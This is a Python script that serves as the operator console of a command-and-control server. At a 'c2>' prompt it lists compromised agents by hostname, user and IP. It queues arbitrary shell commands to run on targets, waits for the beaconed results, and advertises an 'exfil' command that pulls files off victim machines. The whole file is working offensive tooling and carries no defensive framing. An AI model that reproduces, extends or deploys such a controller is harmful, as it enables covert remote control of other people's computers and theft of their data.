import requests, sys, json, datetime

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:4444"


def get_agents():
    r = requests.get(f"{BASE}/op/agents", timeout=5)
    return r.json()

def send(agent_id, cmd):
    r = requests.post(f"{BASE}/op/send/{agent_id}", json={"cmd": cmd}, timeout=5)
    return r.json()

def get_results(agent_id):
    r = requests.get(f"{BASE}/op/results/{agent_id}", timeout=5)
    return r.json()

def list_agents():
    agents = get_agents()
    if not agents:
        print("  (no agents registered yet)")
        return
    print(f"\n  {'ID':<12} {'HOSTNAME':<20} {'USER':<16} {'LAST SEEN':<28} IP")
    print("  " + "-"*90)
    for aid, info in agents.items():
        print(f"  {aid:<12} {info['hostname']:<20} {info['username']:<16} {info['last_seen']:<28} {info['ip']}")
    print()

def show_results(agent_id):
    results = get_results(agent_id)
    if not results:
        print("  (no results yet)")
        return
    for entry in results:
        print(f"\n  [{entry['time']}] $ {entry['cmd']}")
        for line in entry['output'].splitlines():
            print(f"    {line}")

def interactive(agent_id):
    """Drop into a shell-like prompt for a specific agent."""
    print(f"\n  [*] Interactive session with agent {agent_id}")
    print(f"      Type commands to run on target. Special commands:")
    print(f"        exfil <path>  - download a file from the target")
    print(f"        back          - return to main menu\n")
    while True:
        try:
            cmd = input(f"  ({agent_id}) $ ").strip()
        except (EOFError, KeyboardInterrupt):
            break
        if not cmd:
            continue
        if cmd.lower() == "back":
            break
        send(agent_id, cmd)
        print("  [*] Command queued. Waiting for beacon...")
        # Poll for up to 15s for a result
        import time
        before_count = len(get_results(agent_id))
        for _ in range(15):
            time.sleep(1)
            results = get_results(agent_id)
            if len(results) > before_count:
                latest = results[-1]
                print(f"\n  Output:")
                for line in latest['output'].splitlines():
                    print(f"    {line}")
                print()
                break
        else:
            print("  [!] Timed out waiting for result (agent may be slow/offline)")

# ── Main menu ─────────────────────────────────────────────────────────────────

HELP = """
  Commands:
    agents            - list active agents
    use <id>          - open interactive shell with an agent
    results <id>      - dump all stored results from an agent
    send <id> <cmd>   - queue a one-off command (no wait)
    help              - show this menu
    exit              - quit
"""

def main():
    print(f"  Connected to: {BASE}\n")
    while True:
        try:
            raw = input("c2> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n  Bye.")
            break
        if not raw:
            continue
        parts = raw.split(None, 2)
        cmd   = parts[0].lower()

        if cmd in ("exit", "quit"):
            print("  Bye.")
            break
        elif cmd == "agents":
            list_agents()
        elif cmd == "help":
            print(HELP)
        elif cmd == "use" and len(parts) >= 2:
            interactive(parts[1])
        elif cmd == "results" and len(parts) >= 2:
            show_results(parts[1])
        elif cmd == "send" and len(parts) >= 3:
            agent_id = parts[1]
            command  = parts[2]
            r = send(agent_id, command)
            print(f"  {r}")
        else:
            print("  Unknown command. Type 'help' for options.")

if __name__ == "__main__":
    main()